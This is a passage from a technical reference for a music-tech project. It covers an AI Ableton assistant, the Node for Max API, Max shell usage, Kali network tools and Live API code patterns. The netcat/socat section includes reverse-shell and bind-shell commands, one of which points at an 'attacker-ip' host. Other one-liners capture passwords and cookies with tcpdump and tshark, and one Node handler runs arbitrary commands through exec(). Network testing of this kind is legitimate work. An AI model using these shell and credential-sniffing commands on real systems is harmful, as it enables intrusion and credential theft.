
### Overview

AI-powered assistant for music production that integrates with Ableton Live via Max for Live + Node for Max MCP server. Created by Adam Murray. GPL-3.0 licensed, open source, no subscriptions.

**Latest version:** 1.4.4 (March 14, 2026)
**Commits:** 3,906 | **Stars:** 105 | **Forks:** 17

### Capabilities

- Generate and edit MIDI clips
- Manage tracks and scenes
- Automate arrangement workflows through natural language
- Control instruments and effects
- Build arrangements

### Supported AI Providers

- Claude (Anthropic) -- including Claude Desktop and Claude Code
- Gemini (Google) -- including Gemini CLI (free tier)
- ChatGPT (OpenAI)
- Ollama (local/offline)
- LM Studio (local, experimental)
- OpenRouter
- Mistral
- Any MCP-compatible tool (Cline, Cursor, etc.)

### Installation

1. Download `Producer_Pal.amxd` from latest releases
2. Drop onto a track in Ableton Live
3. Configure your chosen AI provider
4. Connect with "connect to ableton" command

### Technical Architecture

- **Language:** 95.1% TypeScript, 2.3% JavaScript, 2.1% Max
- **Bridge:** Node for Max to V8 object for Live API access
- **Communication:** MCP protocol over stdio/SSE

### Key Technical Note

> "The bridge between Node for Max and the v8 object (for Live API access) required some creative solutions."

Node for Max runs as a separate process and cannot directly access the Live API. Producer Pal bridges this by using Node for Max (`node.script`) to run the MCP server, then communicating with a `v8` object inside the same patch that has Live API access.

### Documentation

Full docs at: https://producer-pal.org

---

## 13. Node for Max

Sources:
- https://docs.cycling74.com/apiref/nodeformax/
- https://docs.cycling74.com/max8/vignettes/07_n4m_maxapi
- https://docs.cycling74.com/reference/node.script

### Overview

Node for Max lets you write custom applications using Node.js and communicate with those applications from Max. Each `node.script` object runs a single, separate process.

**Bundled versions:** Node v20.6.1, npm v9.8.1

### Loading the API

```javascript
const maxApi = require("max-api");
```

The `max-api` module is pre-installed -- no `npm install` needed.

### Environment Detection

```javascript
const { MAX_ENV } = require("max-api");

if (process.env.MAX_ENV === MAX_ENV.MAX) {
    // Running in Max standalone
} else if (process.env.MAX_ENV === MAX_ENV.MAX_FOR_LIVE) {
    // Running in Max for Live (Ableton)
} else if (process.env.MAX_ENV === MAX_ENV.STANDALONE) {
    // Running in a Max standalone application
}
```

### API Functions

#### Handler Registration

```typescript
// Register single handler
maxApi.addHandler(selector: string, handler: Function): void;

// Register multiple handlers at once
maxApi.addHandlers({
    selectorA: handlerFunctionA,
    selectorB: handlerFunctionB,
});

// Remove specific handler
maxApi.removeHandler(selector: string): void;

// Remove multiple handlers (no args = remove all)
maxApi.removeHandlers(): void;
```

**Example:**

```javascript
const maxApi = require("max-api");

maxApi.addHandler("set_tempo", (tempo) => {
    maxApi.post(`Setting tempo to ${tempo}\n`);
    // process tempo...
    maxApi.outlet("tempo_set", tempo);
});

maxApi.addHandler("get_info", () => {
    maxApi.outlet("info", "ready", 42);
});
```

#### Output Functions

```typescript
// Send values out of leftmost outlet
// JS objects auto-convert to Max dictionaries
maxApi.outlet(...args: JSONValue[]): Promise<void>;

// Send bang from leftmost outlet
maxApi.outletBang(): Promise<void>;
```

**Example:**

```javascript
// Send a message
await maxApi.outlet("hello", 42, "world");

// Send a dictionary (auto-converts)
await maxApi.outlet({ key: "value", nested: { a: 1 } });

// Send bang
await maxApi.outletBang();
```

#### Dictionary Operations

```typescript
// Get contents of a named Max dictionary
maxApi.getDict(id: string): Promise<JSONObject>;

// Overwrite entire contents of a named Max dictionary
maxApi.setDict(id: string, value: JSONObject): Promise<void>;

// Update a single key in a named Max dictionary
maxApi.updateDict(id: string, key: string, value: any): Promise<void>;
```

**Example:**

```javascript
const maxApi = require("max-api");

// Read a dict
const myDict = await maxApi.getDict("myDictName");
console.log(myDict.someKey);

// Write a dict
await maxApi.setDict("myDictName", {
    tempo: 120,
    tracks: ["drums", "bass", "melody"]
});

// Update single key
await maxApi.updateDict("myDictName", "tempo", 130);
```

#### Logging

```typescript
maxApi.post(message: string, level?: POST_LEVELS): void;
```

**POST_LEVELS enum:**
- `maxApi.POST_LEVELS.ERROR`
- `maxApi.POST_LEVELS.WARN`
- `maxApi.POST_LEVELS.INFO`

### Type Definitions

```typescript
type Anything = string | number | Array<string | number> | JSONObject | JSONArray;
type JSONValue = string | number | boolean | null | JSONObject | JSONArray;
type JSONObject = { [key: string]: JSONValue };
type JSONArray = JSONValue[];
type JSONPrimitive = string | number | boolean | null;
type MaxFunctionSelector = string;
type MaxFunctionHandler = (...args: any[]) => void;
```

### node.script Object Reference

#### Arguments
- `script` [symbol] (optional) -- Entry point JS file or npm package folder

#### Key Attributes

| Attribute | Type | Default | Description |
|-----------|------|---------|-------------|
| `autostart` | int | 0 | Launch Node script automatically |
| `restart` | int | 1 | Auto-restart after handler callback crashes |
| `running` | int | (read-only) | 1 if process active, 0 otherwise |
| `watch` | int | 0 | Auto-relaunch when source file changes |
| `defer` | int | 0 | Route messages to low-priority queue |
| `node_bin_path` | symbol | -- | Override built-in Node executable path |
| `npm_bin_path` | symbol | -- | Override built-in NPM executable path |
| `args` | 16 atoms | -- | Command-line arguments for autostart |

#### Messages

| Message | Description |
|---------|-------------|
| `bang` | Send bang to running Node script |
| `anything [list]` | Send arbitrary message; dicts auto-convert to JSON |
| `script start [args...]` | Start script with optional arguments |
| `script stop` | Terminate script |
| `script running` | Query process status (returns 0 or 1) |
| `script status` | Return Node version dictionary |
| `script processStatus` | Return running process status dictionary |
| `script npm [args...]` | Interface npm (e.g., `script npm install`) |
| `script reboot` | Restart process manager |
| `stdin [list]` | Direct character stream to Node's stdin |
| `reveal` | Show script file in Finder/Explorer |
| `api` | Launch JavaScript documentation |

### Documentation Topics (12 Chapters)

1. Anatomy of an N4M Patch
2. Using npm
3. Working with Projects and Max for Live Devices
4. Differences between js and node.script
5. Stopping, starting and auto-starting a process
6. Using the node.debug object
7. The node.script JS API and max-api Module
8. The node.script lifecycle
9. Using custom binaries for Node and npm
10. Remote debugging
11. stdin, stdout and stderr with node.script
12. Using ECMAScript modules with node.script

### External Resources

- **Core Examples:** https://github.com/Cycling74/n4m-core-examples
- **Project Examples:** https://github.com/cycling74/n4m-examples
- **Community Projects:** https://github.com/Cycling74/n4m-community
- **API Docs:** https://docs.cycling74.com/nodeformax/api/

---

## 14. Node for Max vs js Object

Source: https://docs.cycling74.com/max8/vignettes/04_n4m_jsdifferences

### Architecture Comparison

| Feature | `js` Object | `node.script` Object |
|---------|------------|---------------------|
| **Engine** | SpiderMonkey (embedded in Max) | Node.js (separate process) |
| **Threading** | Low-priority thread only | Separate process (multi-core capable) |
| **Process model** | Runs inside Max process | Runs as separate spawned process |
| **Max API** | Full access (Patcher, Jitter, Live) | No direct access (communicate via messages) |
| **Live API** | Yes (via LiveAPI object) | No (must bridge through `v8` object) |
| **Patcher scripting** | Yes (create/modify objects dynamically) | No |
| **npm packages** | No | Yes (full npm ecosystem) |
| **File system** | Limited | Full Node.js fs module |
| **Networking** | Limited | Full (HTTP, WebSocket, TCP, UDP) |
| **Database** | SQLite only | Any (MongoDB, PostgreSQL, Redis, etc.) |
| **Debugging** | Max console only | Remote debugging with breakpoints |
| **GUI** | No (use jsui for drawing) | No direct GUI, but can serve web UIs |
| **Performance** | Single-threaded, blocks Max | Non-blocking, separate process |

### When to Use js

- Manipulate the Max patcher directly (patcher scripting)
- Access Jitter API
- Access Live API (Max for Live)
- Simple data processing within Max's event flow

### When to Use node.script

- Communicate with web resources without affecting patch performance
- Interact with command-line utilities
- Access file system extensively
- Connect to databases
- Use npm packages
- Need remote debugging
- Run long computations without blocking Max

### Coexistence

Both tools can coexist in the same patch. Common pattern: `node.script` for networking/data, communicating with `js` or `v8` for Live API access.

---

## 15. Max Shell / CLI Integration

### shell Object

The primary method for executing system commands from Max.

**Author:** Jeremy Bernstein (Bill Orcutt maintained)
**GitHub:** https://github.com/jeremybernstein/shell

```
[shell]  -- executes terminal commands on macOS and Windows
```

**Usage in Max patch:**
```
[message: ls -la]
    |
[shell]
    |
[print]  -- outputs command results
```

### Alternative: Node for Max CLI

Using `node.script` with `child_process`:

```javascript
const maxApi = require("max-api");
const { exec } = require("child_process");

maxApi.addHandler("run_command", (cmd) => {
    exec(cmd, (error, stdout, stderr) => {
        if (error) {
            maxApi.post(`Error: ${error.message}\n`);
            return;
        }
        maxApi.outlet("result", stdout.trim());
    });
});
```

### Known Limitation

Max does not load user PATH variables. Terminal commands that rely on user-specific PATH entries must use absolute paths in scripts.

### Commandline Interface for Max

A community tool providing a commandline text editor within Max patches for live-coding parameter control during performances.

---

## 16. Network Testing Tools (Kali Linux)

Tools relevant to the coLaB project for UDP communication, packet analysis, port scanning, and relay testing.

### 16.1 Netcat (nc)

Swiss Army knife for network connections -- reads and writes data across TCP and UDP.

#### Basic Syntax

```bash
nc [options] [host] [port]          # Client/Connect mode
nc -l [options] [port]              # Listen/Server mode
```

#### Flags Reference

| Flag | Description |
|------|-------------|
| `-l` | Listen mode (server) |
| `-p` | Specify port number |
| `-u` | Use UDP instead of TCP |
| `-v` | Verbose output |
| `-n` | Skip DNS resolution (faster) |
| `-z` | Zero I/O mode (port scanning) |
| `-w N` | Timeout in seconds |
| `-k` | Keep listening after disconnect |
| `-e` | Execute program on connection |
| `-4` | IPv4 only |
| `-6` | IPv6 only |
| `-q N` | Client stays up N seconds after EOF |
| `-D` | Full debugging mode |
| `-c` | Execute shell command |

#### TCP Operations

```bash
# TCP chat server
nc -lv 8000                                    # Server
nc 192.168.1.9 8000                            # Client

# TCP file transfer (download)
nc -lv 8000 < file.txt                         # Server (sends)
nc -nv 192.168.1.9 8000 > file.txt             # Client (receives)

# TCP file transfer (upload)
nc -lv 8000 > file.txt                         # Server (receives)
nc 192.168.1.9 8000 < file.txt                 # Client (sends)

# Directory transfer (tar)
tar -cvf - dir_name | nc -l 8000               # Server
nc -n 192.168.1.9 8000 | tar -xvf -            # Client

# Encrypted file transfer
openssl enc -des3 -pass pass:pw | nc 192.168.1.9 8000   # Sender
nc -l 8000 | openssl enc -d -des3 -pass pass:pw > f.txt  # Receiver
```

#### UDP Operations

```bash
# UDP listener
nc -ul 8000

# UDP client/sender
nc -u 192.168.1.9 8000

# UDP port check
nc -vu google.com 53

# UDP port scan
nc -vzu 192.168.1.9 1-100
```

#### Port Scanning

```bash
# Single port
nc -zv site.com 80

# Multiple specific ports
nc -zv hostname.com 80 84 443

# Port range
nc -zv site.com 80-84

# IP address with range
nc -v -n 192.168.1.1 1-1000

# TCP banner grab
echo "" | nc -zv -wl [host] [port_range]

# Verbose port scan with DNS skip
nc -zvn 192.168.1.1 21-25
```

#### Proxy / Port Forwarding

```bash
# Simple proxy
nc -lp 8001 -c "nc 127.0.0.1 8000"

# Pipe-based proxy
nc -l 8001 | nc 127.0.0.1 8000

# Linux relay with backpipe
nc -l -p [port] 0 < backpipe | nc [client_IP] [port] | tee backpipe
```

#### Reverse Shell

```bash
# Server (attacker listener)
nc -lv 8000

# Client (target -- connects back)
nc 192.168.1.9 8000 -v -e /bin/bash
```

#### Remote Shell

```bash
# Server (target -- opens shell)
nc -lv 8000 -e /bin/bash                       # Linux
nc -l -p 8000 -e cmd.exe                       # Windows

# Client (connects to shell)
nc 192.168.1.9 8000
```

#### HTTP Operations

```bash
# Simple web server
printf 'HTTP/1.1 200 OK\n\n%s' "$(cat index.html)" | netcat -l 8999

# HTTP GET request
printf "GET / HTTP/1.0\r\n\r\n" | nc google.com 80

# Video streaming
cat video.avi | nc -l 8000                      # Server
nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -   # Client
```

#### Disk Cloning

```bash
dd if=/dev/sda | nc -l 8000                     # Server (source)
nc -n 192.168.1.9 8000 | dd of=/dev/sda         # Client (target)
```

---

### 16.2 tcpdump

Captures and analyzes network packets from the command line.

#### Basic Syntax

```bash
sudo tcpdump -i <interface> [options] [filter_expression]
```

#### Flags Reference

| Flag | Description |
|------|-------------|
| `-i eth0` | Specify interface |
| `-nn` | Disable hostname AND port resolution |
| `-n` | Disable hostname resolution only |
| `-s0` | Unlimited snap length (capture full packets) |
| `-v` / `-vv` | Verbose / very verbose output |
| `-A` | ASCII text output |
| `-X` | Hexadecimal and ASCII output |
| `-l` | Line-buffered mode (for piping) |
| `-w file.pcap` | Write raw packets to file |
| `-r file.pcap` | Read from pcap file |
| `-c N` | Stop after N packets |
| `-G N` | Rotate capture files every N seconds |
| `-C N` | Rotate after N MB |

#### Protocol Filters

```bash
# UDP traffic
sudo tcpdump -i eth0 udp
sudo tcpdump -i eth0 proto 17            # Same thing (protocol number)

# TCP traffic
sudo tcpdump -i eth0 tcp
sudo tcpdump -i eth0 proto 6

# ICMP packets
sudo tcpdump -n icmp

# IPv6 UDP
sudo tcpdump -nn ip6 proto 17

# IPv6 TCP
sudo tcpdump -nn ip6 proto 6
```

#### Host and Port Filters

```bash
# By host
sudo tcpdump -i eth0 host 10.10.1.1

# By destination
sudo tcpdump -i eth0 dst 10.10.1.20

# By source
sudo tcpdump -i eth0 src 10.10.1.20

# By port
sudo tcpdump -i eth0 port 80

# By port range
sudo tcpdump -i eth0 portrange 80-443

# Combined
sudo tcpdump -i eth0 src 10.10.1.1 and dst port 80
```

#### UDP-Specific Captures

```bash
# All UDP traffic
sudo tcpdump -i eth0 udp

# SNMP (UDP port 161)
sudo tcpdump -n -s0 port 161 and udp

# DNS (UDP port 53)
sudo tcpdump -i eth0 -s0 port 53

# DHCP
sudo tcpdump -v -n port 67 or 68

# NTP
sudo tcpdump dst port 123

# Custom UDP port
sudo tcpdump -i eth0 -nn udp port 9000
```

#### HTTP Analysis

```bash
# Extract User Agents
sudo tcpdump -nn -A -s1500 -l | grep "User-Agent:"

# User Agents + Hosts
sudo tcpdump -nn -A -s1500 -l | egrep -i 'User-Agent:|Host:'

# HTTP GET packets
sudo tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'

# HTTP POST packets
sudo tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'

# Extract URLs
sudo tcpdump -s 0 -v -n -l | egrep -i "POST /|GET /|Host:"

# Capture cookies
sudo tcpdump -nn -A -s0 -l | egrep -i 'Set-Cookie|Host:|Cookie:'

# HTTP data packets only
tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

#### Password / Credential Capture

```bash
# HTTP POST passwords
sudo tcpdump -s 0 -A -n -l | egrep -i "POST /|pwd=|passwd=|password=|Host:"

# Multi-protocol plaintext passwords
sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet \
  -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '
```

#### Email Protocols

```bash
# SMTP headers
sudo tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'
```

#### File Operations

```bash
# Write capture to file
sudo tcpdump -i eth0 -s0 -w test.pcap

# Rotate by time (hourly) and size (200MB)
tcpdump -w /tmp/capture-%H.pcap -G 3600 -C 200

# Read from file
tcpdump -nr file.pcap

# Read with filter
tcpdump -nr ipv6-test.pcap ip6 proto 17

# Stream to remote Wireshark
ssh root@remote 'tcpdump -s0 -c 1000 -nn -w - not port 22' | wireshark -k -i -
```

#### TCP Flag Filters

```bash
# SYN/FIN packets
tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet'

# RST packets
tcpdump 'tcp[tcpflags] & (tcp-rst) != 0'
```

#### Analysis One-Liners

```bash
# Top hosts by packet count
sudo tcpdump -nnn -t -c 200 | cut -f 1,2,3,4 -d '.' | sort | uniq -c | sort -nr | head -n 20
```

#### Ollama / LLM Traffic Capture

```bash
sudo tcpdump -i any -s 0 port 11434 -w ollama.pcap
sudo tcpdump -i lo -s 0 port 11434 -w ollama.pcap
tshark -r ollama.pcap
```

#### Filter Logic Operators

| Operator | Alternative |
|----------|-------------|
| `and` | `&&` |
| `or` | `||` |
| `not` | `!` |

---

### 16.3 tshark (Wireshark CLI)

Command-line version of Wireshark for packet capture and analysis.

#### Basic Syntax

```bash
tshark -i <interface> [capture_options] [display_filters]
```

#### Key Options

| Flag | Description |
|------|-------------|
| `-i <iface>` | Capture interface |
| `-f "filter"` | Capture filter (pcap/BPF syntax) |
| `-Y "filter"` | Display filter (Wireshark syntax) |
| `-w file.pcap` | Write to file |
| `-r file.pcap` | Read from file |
| `-c N` | Stop after N packets |
| `-T fields` | Field extraction output mode |
| `-e field.name` | Specify field to extract |
| `-E separator=,` | Change field separator |

#### Output Formats

| Flag | Format |
|------|--------|
| `-T fields` | Custom field extraction |
| `-T json` | JSON output |
| `-T xml` | XML output |
| `-T text` | Plain text (default) |

#### Capture Examples

```bash
# Live capture to file
tshark -i wlan0 -w capture.pcap

# Read pcap file
tshark -r capture.pcap

# Capture with filter
tshark -i eth0 -f "udp port 9000" -w udp_capture.pcap

# Capture N packets
tshark -i eth0 -c 100 -w sample.pcap
```

#### UDP-Specific Filters

```bash
# Capture filter (BPF syntax)
tshark -i eth0 -f "udp"
tshark -i eth0 -f "udp port 9000"
tshark -i eth0 -f "udp and host 192.168.1.100"

# Display filter (Wireshark syntax)
tshark -r capture.pcap -Y "udp"
tshark -r capture.pcap -Y "udp.port == 9000"
tshark -r capture.pcap -Y "udp.dstport == 9000"
tshark -r capture.pcap -Y "udp.length > 100"
```

#### HTTP Analysis

```bash
# Extract HTTP request fields
tshark -i wlan0 -Y http.request -T fields -e http.host -e http.user_agent

# Parse user agents from pcap
tshark -r example.pcap -Y http.request -T fields -e http.host -e http.user_agent | sort | uniq -c | sort -n

# HTTP with multiple fields
tshark -r example.pcap -Y http.request -T fields -e http.host -e ip.dst -e http.request.full_uri

# Extract POST passwords
tshark -i wlan0 -Y 'http.request.method == POST and tcp contains "password"' | grep password
```

#### DNS Analysis

```bash
# DNS query/response extraction
tshark -i wlan0 -f "src port 53" -n -T fields -e dns.qry.name -e dns.resp.addr

# DNS with timestamps and IPs
tshark -i wlan0 -f "src port 53" -n -T fields -e frame.time -e ip.src -e ip.dst -e dns.qry.name -e dns.resp.addr
```

#### File/Object Extraction

```bash
# Extract SMB objects from pcap
tshark -nr test.pcap --export-objects smb,tmpfolder

# Extract HTTP objects from pcap
tshark -nr test.pcap --export-objects http,tmpfolder
```

---

### 16.4 nmap

Network exploration and port scanning tool.

#### Basic Syntax

```bash
nmap [scan_type] [options] <target>
```

#### Target Selection

```bash
nmap 192.168.1.1                    # Single IP
nmap www.example.com                # Hostname
nmap 192.168.1.1-20                 # IP range
nmap 192.168.1.0/24                 # Subnet
nmap -iL targets.txt                # From file
nmap -6 fe80::1                     # IPv6
```

#### Port Selection

```bash
nmap -p 22 192.168.1.1              # Single port
nmap -p 1-100 192.168.1.1           # Port range
nmap -p 22,80,443 192.168.1.1       # Specific ports
nmap -p http,https 192.168.1.1      # By service name
nmap -p- 192.168.1.1                # All 65535 ports
nmap -F 192.168.1.1                 # Top 100 common ports
```

#### Scan Types

```bash
nmap -sT 192.168.1.1                # TCP connect scan
nmap -sS 192.168.1.1                # TCP SYN stealth (requires root)
nmap -sU -p 123,161,162 192.168.1.1 # UDP scan
nmap -sA 192.168.1.1                # TCP ACK (firewall mapping)
nmap -Pn -F 192.168.1.1             # Skip discovery, fast scan
nmap -sS -sU -T4 -A -v 192.168.1.1 # Combined TCP SYN + UDP + aggressive
```

#### UDP Scanning (Critical for coLaB)

```bash
# Basic UDP scan
nmap -sU 192.168.1.1

# UDP scan specific ports
nmap -sU -p 53,67,68,123,161,500,4500,5353,9000 192.168.1.1

# Combined TCP + UDP
nmap -sS -sU 192.168.1.1

# UDP with service detection
nmap -sU -sV 192.168.1.1

# Separate TCP/UDP port lists
nmap -p T:80,443,U:53,161 192.168.1.1

# UDP scan of subnet
nmap -sU -p 9000 192.168.1.0/24
```

#### Timing & Performance

```bash
nmap -T0 ...   # Paranoid (IDS evasion)
nmap -T1 ...   # Sneaky
nmap -T2 ...   # Polite
nmap -T3 ...   # Normal (default)
nmap -T4 ...   # Aggressive
nmap -T5 ...   # Insane

nmap --min-rate 5000 192.168.1.1    # Minimum packet rate
nmap --max-rate 1000 192.168.1.1    # Maximum packet rate
nmap --max-retries 2 192.168.1.1    # Limit retries
nmap --host-timeout 30s 192.168.1.1 # Per-host timeout
```

#### Host Discovery

```bash
nmap -sL 192.168.1.0/24             # List targets only (no scan)
nmap -Pn 192.168.1.1                # Skip host discovery
nmap -sn 192.168.1.0/24             # Ping scan only (no port scan)
nmap -PS443 192.168.1.1             # TCP SYN discovery on port 443
nmap -PA80 192.168.1.1              # TCP ACK discovery on port 80
nmap -PU53 192.168.1.1              # UDP discovery on port 53
```

#### Service & OS Detection

```bash
nmap -sV 192.168.1.1                        # Version detection
nmap -sV --version-intensity 5 192.168.1.1   # Aggressive version detect
nmap -sV --version-intensity 0 192.168.1.1   # Light banner grab
nmap -A 192.168.1.1                          # OS + services + traceroute
nmap -O 192.168.1.1                          # OS detection only
```

#### NSE Scripts

```bash
nmap -sV -sC 192.168.1.1                            # Default safe scripts
nmap --script-help=http-enum                         # Script docs
nmap -sV -p 22 --script=ssh-hostkey 192.168.1.1      # Specific script
nmap -sV --script=smb* 192.168.1.1                   # Wildcard scripts
nmap -p 80,443 --script=http-title 192.168.1.1       # HTTP titles
nmap --script=http-enum 192.168.1.0/24               # Enumerate web paths
nmap -p 443 --script=ssl-cert,ssl-enum-ciphers 192.168.1.1  # TLS info
```

#### Vulnerability Scanning

```bash
# DDoS reflector detection
nmap -sU -A -Pn -n -pU:19,53,123,161 \
  --script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24

# Heartbleed check
nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24
```

#### Output Formats

```bash
nmap -oN output.txt 192.168.1.1     # Normal text
nmap -oX output.xml 192.168.1.1     # XML
nmap -oG output.txt 192.168.1.1     # Greppable
nmap -oA output 192.168.1.1         # All formats
```

---

### 16.5 socat

Multipurpose relay for bidirectional data transfer between two independent data channels.

#### Basic Syntax

```bash
socat [options] <address1> <address2>
```

Socat is **bidirectional** -- argument order generally does not matter (unless using `-u` for unidirectional).

#### Key Options

| Flag | Description |
|------|-------------|
| `-x` | Display hexadecimal output |
| `-u` | Unidirectional mode (addr1=read, addr2=write) |
| `-v` | Verbose output |
| `-d` / `-dd` | Debug levels |

#### Address Types

| Address | Description |
|---------|-------------|
| `TCP4-LISTEN:port` | TCP listener on IPv4 |
| `TCP4:host:port` | TCP client connection |
| `TCP4-CONNECT:host:port` | Same as above (explicit) |
| `UDP4-RECVFROM:port` | UDP receiver |
| `UDP4-SENDTO:host:port` | UDP sender |
| `UDP4-LISTEN:port` | UDP listener |
| `OPENSSL-LISTEN:port` | TLS/SSL listener |
| `OPENSSL:host:port` | TLS/SSL client |
| `UNIX-LISTEN:path` | Unix socket listener |
| `UNIX-CONNECT:path` | Unix socket client |
| `EXEC:command` | Execute command |
| `FILE:path` | File read/write |
| `STDIN` / `STDOUT` | Standard I/O |
| `-` | Shorthand for STDIO |

#### Common Address Options

| Option | Description |
|--------|-------------|
| `fork` | Accept multiple connections |
| `reuseaddr` | Allow socket address reuse |
| `bind=addr` | Bind to specific address |
| `pf=ip4` | IPv4 protocol family |
| `raw` | Raw serial mode |
| `crnl` | Carriage return / newline conversion |
| `b115200` | Baud rate (serial) |
| `pty` | Pseudo-terminal |
| `verify=0` | Skip certificate verification |

#### UDP Relay & Forwarding

```bash
# UDP port forwarding (relay port 161 -> 10161)
sudo socat UDP4-RECVFROM:161,fork UDP4-SENDTO:localhost:10161

# UDP to TCP conversion
socat -u udp-recvfrom:1234,fork tcp:localhost:4321

# Bidirectional UDP relay
socat UDP4-RECVFROM:9000,fork UDP4-SENDTO:192.168.1.100:9000
```

#### TCP Operations

```bash
# TCP port forwarding
socat TCP4-LISTEN:3180,reuseaddr,fork TCP4:remote-host:22

# TCP listener with hex output
socat -x tcp-listen:3180,fork -

# Connect to HTTP server
socat TCP4:example.com:80 -

# Connect to HTTPS server
socat openssl:example.com:443 -
```

#### TLS/SSL Operations

```bash
# HTTP to HTTPS proxy (terminate TLS)
socat OPENSSL-LISTEN:443,reuseaddr,pf=ip4,fork,cert=server.pem,\
  cafile=client.crt,verify=0 TCP4-CONNECT:127.0.0.1:80
```

#### Serial Device Bridging

```bash
# Network port to serial device
socat TCP4-LISTEN:8266,fork,reuseaddr /dev/ttyUSB0,raw,crnl,b115200
```

#### TOR Forwarding

```bash
socat tcp4-listen:8080,reuseaddr,fork \
  socks4A:127.0.0.1:hidden-service.onion:80,socksport=9050
```

#### Reverse Shell

```bash
# Attacker (listener)
socat file:`tty`,raw,echo=0 tcp-listen:3180

# Target (connects back)
socat exec:'bash -i',pty,stderr tcp:attacker-ip:3180
```

#### HTTP Request

```bash
(echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r" && sleep 1) \
  | socat tcp4:example.com:80 -
```

#### Protocol Conversion for coLaB

```bash
# UDP input -> TCP output (sensor data relay)
socat -u UDP4-RECVFROM:9000,fork TCP4:192.168.1.50:9001

# TCP input -> UDP output
socat -u TCP4-LISTEN:9001,fork UDP4-SENDTO:192.168.1.100:9000

# Bidirectional UDP proxy with hex debug
socat -x -v UDP4-RECVFROM:9000,fork UDP4-SENDTO:192.168.1.100:9000
```

---

### 16.6 Quick Reference: coLaB-Relevant Commands

These are the most commonly needed commands for testing UDP/OSC communication in our coLaB music tech context.

#### Test UDP Listener (Receive OSC/MIDI)

```bash
# Listen for incoming UDP on port 9000
nc -ul 9000

# Listen with verbose output
nc -ulv 9000

# Capture UDP packets to file for analysis
sudo tcpdump -i eth0 -nn udp port 9000 -w osc_capture.pcap

# Monitor with tshark
tshark -i eth0 -f "udp port 9000"
```

#### Test UDP Sender

```bash
# Send data to UDP port
echo "test" | nc -u 192.168.1.100 9000

# Interactive UDP sender
nc -u 192.168.1.100 9000
# (type messages, press Enter to send)
```

#### Scan for Open UDP Ports

```bash
# Quick UDP scan of common music/OSC ports
nmap -sU -p 3333,7400,8000,8080,9000,9001,10000,57120 192.168.1.100

# Full UDP scan (slow)
nmap -sU -p- 192.168.1.100
```

#### Relay/Forward UDP Traffic

```bash
# Forward local port 9000 to remote host
socat UDP4-RECVFROM:9000,fork UDP4-SENDTO:192.168.1.100:9000

# Debug relay (see hex data)
socat -x -v UDP4-RECVFROM:9000,fork UDP4-SENDTO:192.168.1.100:9000
```

#### Analyze Captured Traffic

```bash
# Read pcap, show only UDP
tshark -r capture.pcap -Y "udp"

# Extract specific fields
tshark -r capture.pcap -Y "udp.port == 9000" -T fields -e frame.time -e ip.src -e ip.dst -e udp.length -e data

# Analyze OSC packets
tshark -r capture.pcap -Y "osc"
```

---

## Appendix A: Common Patterns & Best Practices

### Max for Live Device Initialization

```javascript
// In v8 or js object -- ALWAYS use this pattern:

function bang() {
    // This is triggered by live.thisdevice
    var api = new LiveAPI("live_set");
    post("Connected. Tempo:", api.get("tempo"), "\n");
}

// NEVER do this:
// var api = new LiveAPI("live_set");  // FAILS -- global code
```

### Observing Property Changes

```javascript
function bang() {
    var api = new LiveAPI(onTempoChange, "live_set");
    api.property = "tempo";  // Start observing
}

function onTempoChange(args) {
    post("Tempo changed:", args, "\n");
    outlet(0, "tempo", args[1]);
}
```

### Iterating All Tracks

```javascript
function bang() {
    var song = new LiveAPI("live_set");
    var trackCount = song.getcount("tracks");

    for (var i = 0; i < trackCount; i++) {
        var track = new LiveAPI("live_set tracks " + i);
        post("Track", i, ":", track.get("name"), "\n");
    }
}
```

### Creating and Populating a MIDI Clip

```javascript
function createSimpleClip(trackIdx, slotIdx) {
    var slot = new LiveAPI("live_set tracks " + trackIdx + " clip_slots " + slotIdx);

    if (slot.get("has_clip") == false) {
        slot.call("create_clip", 4);  // 4 beats = 1 bar
    }

    var clip = new LiveAPI(slot.unquotedpath + " clip");
    clip.call("remove_notes_extended", 0, 128, 0, 4);

    var notes = [
        { pitch: 60, start_time: 0, duration: 0.5, velocity: 100 },
        { pitch: 62, start_time: 0.5, duration: 0.5, velocity: 90 },
        { pitch: 64, start_time: 1, duration: 0.5, velocity: 100 },
        { pitch: 65, start_time: 1.5, duration: 0.5, velocity: 90 },
        { pitch: 67, start_time: 2, duration: 1, velocity: 110 },
        { pitch: 64, start_time: 3, duration: 1, velocity: 100 },
    ];

    clip.call("add_new_notes", { notes: notes });
    clip.set("name", "Generated Scale");
}
```

### Node for Max -- MCP Bridge Pattern

```javascript
// node_server.js (runs in node.script)
const maxApi = require("max-api");
const express = require("express");

const app = express();
app.use(express.json());

app.post("/set-tempo", (req, res) => {
    const { tempo } = req.body;
    // Send to Max, which forwards to v8 object with Live API access
    maxApi.outlet("set_tempo", tempo);
    res.json({ status: "ok" });
});

maxApi.addHandler("tempo_result", (value) => {
    // Handle response from Max/v8
});

app.listen(3000, () => {
    maxApi.post("MCP server running on port 3000\n");
});
```

---

## Appendix B: Source URLs

| # | Source | URL |
|---|--------|-----|
| 1 | API Reference Index | https://docs.cycling74.com/apiref/ |
| 2 | LiveAPI JS Reference | https://docs.cycling74.com/max8/vignettes/jsliveapi |
| 3 | Creating M4L Devices | https://docs.cycling74.com/max8/vignettes/live_api |
| 4 | JS Usage in Max | https://docs.cycling74.com/max8/vignettes/javascript_usage_topic |
| 5 | JS in Live Overview | https://adammurray.link/max-for-live/js-in-live/ |
| 6 | Live API Tutorial | https://adammurray.link/max-for-live/js-in-live/live-api/ |
| 7 | MIDI Clip Generation | https://adammurray.link/max-for-live/js-in-live/generating-midi-clips/ |
| 8 | V8 Engine Overview | https://adammurray.link/max-for-live/v8-in-live/ |
| 9 | V8 Getting Started | https://adammurray.link/max-for-live/v8-in-live/getting-started/ |
